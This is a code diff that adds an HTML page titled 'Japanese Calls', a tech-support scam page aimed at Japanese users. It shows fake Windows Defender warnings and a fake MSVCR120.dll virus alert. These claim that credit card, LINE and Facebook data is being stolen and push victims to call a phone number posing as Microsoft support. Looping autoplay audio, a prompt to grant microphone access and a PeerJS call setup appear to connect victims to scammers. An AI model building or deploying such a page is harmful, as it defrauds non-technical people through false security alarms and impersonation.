@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+        <title>Japanese Calls</title>
+        <link rel="stylesheet" href="index.css" />
+
+        <!-- import the webpage's javascript file -->
+        <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/davidshimjs-qrcodejs@0.0.2/qrcode.min.js"></script>
+        <link
+            href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+            crossorigin="anonymous"
+        />
+        <script src="script.js" defer></script>
+    </head>
+    <body>
+        <div id="age-confirmation-modal">
+            <div class="innerContainer">
+                <img src="modal-pic.png" style="width: 500px" alt="Cut" />
+            </div>
+        </div>
+
+        <div id="takemicpermission">
+            <div id="permissioninstruction">
+                <img src="warning.png" height="100px" width="100px" />
+                <p>左側の</p>
+                <p>許可ボタンを</p>
+                <p>クリックしてください</p>
+                <img src="ok.png" height="100px" width="auto" />
+            </div>
+        </div>
+        <div id="windowsscreen" class="call-btn">
+            <div id="windowsmodal1">
+                <div style="text-align: center">
+                    <strong>WindowsDefender-セキュリティ警告</strong>
+                    <br />
+                    <img src="warning.png" height="120px" width="auto" />
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <p style="margin-left: 20px; margin-right: 20px">
+                            DF;この深刻な問題に注意してください。そうしないと、コンピュータネットワークがバーストし、コンピュータがハードウェアの問題に直面する可能性があります。
+                            これはあなたのコンピュータの故障につながる可能性があり、あなたのすべての個人情報がハッキングされる可能性があります。<br />
+                            1クレジットカードの詳細 <br />
+                            2LINEアプリケーション情報 <br />
+                            3メールアドレス<br />
+                            4フェイスブックログイン <br />
+                            5保存されたデータとファイル<br />
+                            電話 : 050-5479-3644<br />
+                        </p>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-8"></div>
+                    <div class="col-4">
+                        <button style="border: 1px solid blue">Cancel</button>
+                        <button style="border: 1px solid blue">OK</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="windowsmodal">
+                <div class="row">
+                    <div class="col-10">
+                        <strong style="float: left"
+                            >C:/WINDOWS/SYSTEM32/MSVCR120.dll</strong
+                        >
+                    </div>
+                    <div class="col-2">
+                        <img
+                            onclick="removemodal()"
+                            src="cancel.png"
+                            style="float: right; cursor: pointer"
+                            height="20px"
+                            width="auto"
+                        />
+                    </div>
+                </div>
+
+                <br />
+                <br />
+                <div class="row">
+                    <div class="col-1">
+                        <img
+                            src="remove.png"
+                            height="30px"
+                            width="auto"
+                            style="
+                                margin-left: 20px;
+                                margin-right: 20px;
+                                float: left;
+                            "
+                        />
+                    </div>
+
+                    <div class="col-11">
+                        <p style="margin-left: 20px">
+                            !!アラート!!<br />
+                            エラーコード：-0x2b437c<br />
+                            このウイルスは、個人データをハッカーに送信することが判明しています。
+                            Microsoftサポートに連絡して、すぐに削除してください。
+                            フリーダイヤル：050-5479-3644
+                        </p>
+                    </div>
+                </div>
+
+                <div style="text-align: right; margin-right: 20px">
+                    <button
+                        onclick="removemodal()"
+                        style="padding-left: 20px; padding-right: 20px"
+                    >
+                        OK
+                    </button>
+                </div>
+            </div>
+
+            <div id="windowsmodalloading" style="display: none">
+                <div id="divSpinner" class="spinner loading">
+                    <div class="loading-text">
+                        マイクロソフトサポートへの接続呼び出し ...
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="connectedScreen">
+            <img src="connected.gif" height="100%" width="100%" />
+        </div>
+
+        <div hidden>
+            <audio id="clickallow" autoplay loop>
+                <source
+                    id="audiosource"
+                    src="clickallow.mp3"
+                    type="audio/mpeg"
+                />
+            </audio>
+
+            <audio id="audioElement" autoplay loop>
+                <source id="audiosource" src="audio.mp3" type="audio/mpeg" />
+            </audio>
+            <div>
+                <p id="caststatus" class="big"></p>
+                <!-- <button class="call-btn"></button> -->
+                <section class="call-container" hidden>
+                    <div class="audio-container">
+                        <audio id="remoteAudio"></audio>
+                    </div>
+                </section>
+            </div>
+
+            <section class="modal">
+                <div id="close">close</div>
+                <div class="inner-modal">
+                    <label>Give us your friend's device ID</label>
+                    <input
+                        placeholder="Enter your friend's device ID"
+                        aria-colcount="10"
+                    />
+                    <button class="connect-btn">Connect</button>
+                </div>
+            </section>
+        </div>
+        <script
+            src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"
+            integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB"
+            crossorigin="anonymous"
+        ></script>
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+            integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13"
+            crossorigin="anonymous"
+        ></script>
+    </body>
+</html>
